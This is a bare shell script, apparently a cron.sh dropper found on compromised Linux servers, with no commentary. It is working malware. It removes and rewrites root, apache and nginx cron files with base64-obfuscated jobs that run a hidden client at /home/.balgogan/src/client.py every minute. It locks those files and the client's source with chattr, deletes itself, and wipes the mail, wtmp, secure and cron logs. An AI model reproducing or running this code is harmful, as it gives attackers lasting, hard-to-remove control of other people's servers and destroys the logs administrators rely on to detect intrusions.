PWD=$(pwd)
chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1
chattr -ia /home/.balgogan/src/*
rm -rf /etc/cron.d/root /etc/cron.d/apache /etc/cron.d/nginx /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" | crontab -
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" | crontab -
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/root
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/root
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/apache
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/apache
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/nginx
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/nginx
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/root
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/root
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/crontabs/root
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/crontabs/root
echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.hourly/oanacroner1
echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.hourly/oanacroner1
rm -rf $PWD/cron.sh
chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 
chattr +ia /home/.balgogan/src/*
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
